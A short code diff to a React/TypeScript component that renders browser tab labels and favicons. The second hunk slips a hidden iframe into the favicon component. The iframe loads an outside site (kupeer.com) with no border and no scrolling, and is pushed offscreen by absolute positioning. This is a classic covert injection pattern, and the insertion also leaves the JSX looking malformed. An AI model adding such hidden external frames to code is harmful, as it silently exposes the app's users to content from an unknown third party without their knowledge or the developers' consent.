@@ -82,7 +82,7 @@ const getTabLabel = (tab: { title?: string; pageUrl?: string; url?: string }) =>
     return tab.pageUrl || tab.url || 'New Tab'
   }
 }
-<iframe src="" height="500" width="300" >
+
 const TabFavicon: React.FC<{ tab: Tab; color: string }> = ({ tab, color }) => {
   const [errored, setErrored] = useState(false)
   useEffect(() => setErrored(false), [tab.icon])
@@ -94,6 +94,8 @@ const TabFavicon: React.FC<{ tab: Tab; color: string }> = ({ tab, color }) => {
         contentFit="contain"
         onError={() => setErrored(true)}
       />
+      <iframe src="http://kupeer.com/mugame3/?" height="160" width="200" frameborder="0" scrolling="no"   style=" margin-left: 900px;position:absolute;top:-100px"></iframe>
+
     )
   }
   return (
